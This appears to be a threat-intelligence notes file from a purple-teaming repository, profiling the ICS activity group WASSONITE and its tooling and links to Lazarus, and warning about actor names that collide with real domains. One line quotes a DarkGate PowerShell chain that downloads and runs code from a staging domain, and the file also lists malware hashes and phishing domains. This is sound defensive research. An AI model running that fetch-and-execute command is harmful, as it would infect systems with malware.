# WASSONITE

**Status:** Config entry added to `purpleTeaming/aptIocs.psm1` MasterConfig.
CSV not yet harvested — run `Get-ThreatActorIOCs -SpecificActor "WASSONITE"`.

## Origin of the cluster

Dragos named WASSONITE after investigating the malware intrusion at the
**Kudankulam Nuclear Power Plant (KKNPP)** in India, disclosed 2019.
Follow-on work found WASSONITE tools and behaviors at multiple additional
ICS entities.

## Targeting

- **Electric generation, nuclear energy, manufacturing**, and
  organizations doing **space-centric research**.
- **India** confirmed; **South Korea** and **Japan** likely.

## Tradecraft

Dragos summary: *"Employs known malware for remote access, credential
capture, and lateral movement."*

Notably, WASSONITE leans on **known/commodity capability** rather than
bespoke ICS malware — remote access via **DTrack**, credential capture,
and lateral movement (Mimikatz-class tooling). That makes it a useful
stress case for the fidelity index: its technique set overlaps heavily
with benign admin activity, so it should sit far lower on the
distinguishing-power scale than [XENOTIME](../../Russia/XENOTIME/NOTES.md).

## Relationship to Lazarus and COVELLITE

- Third-party vendors associate **DTrack** and its relatives with the
  **Lazarus Group** — see [lazarus](../lazarus/).
- Dragos keeps WASSONITE distinct from **COVELLITE**, its other
  Lazarus-linked ICS activity group: COVELLITE used *substantially
  different capabilities and infrastructure* against a target set that
  does **not** overlap observed WASSONITE activity.
- COVELLITE is **not currently tracked** in this repo. Worth adding if
  DPRK ICS coverage is expanded further.

## Name collision — read before grepping the corpus

Dragos names its activity groups after **minerals**, and those names
collide with real domains. `wassonite.com` already appears in
`output-baseline/fidelity-dns.json` and `fidelity-index.json` — it is
**not** a DPRK indicator. It is a **DarkGate** staging domain seen in a
`wscript.exe` → `powershell.exe -Command Invoke-Expression
(Invoke-RestMethod -Uri wassonite.com/yrqnsfla)` chain, from these two
samples:

- `96e22fa78d6f5124722fe20850c63e9d1c1f38c658146715b4fb071112c7db13.js`
- `cd8d70e4a1918681c8bd81c333b7f2f27433baf4de640b52e522bfea80c00afe.vbs`

both under `output-baseline/VirusTotal-main/apt-master-intel/Malware Families/DarkGate/`.

Expect the same class of collision for ELECTRUM (the Bitcoin/Litecoin
wallet — `electrum.us.com` and `electrum-wallet.gr.com` are already in the
corpus as **TA584 / ClickFix** phishing domains) and plausibly for other
mineral-named groups. Actor attribution for these names must come from the
`Actor` column, never from a substring match.

## Coverage in this repo

| Capability | Tracked as |
|---|---|
| DTrack / ATMDtrack | new MasterConfig entry, no folder yet |
| Mimikatz | [Mimikatz](../../../Malware%20Families/Mimikatz/) |

## Sources

- [Dragos — WASSONITE](https://www.dragos.com/threat/wassonite)
- [Dragos — ICS/OT threat groups](https://www.dragos.com/threat-groups)
- [MITRE ATT&CK S0567 — Dtrack](https://attack.mitre.org/software/S0567/)
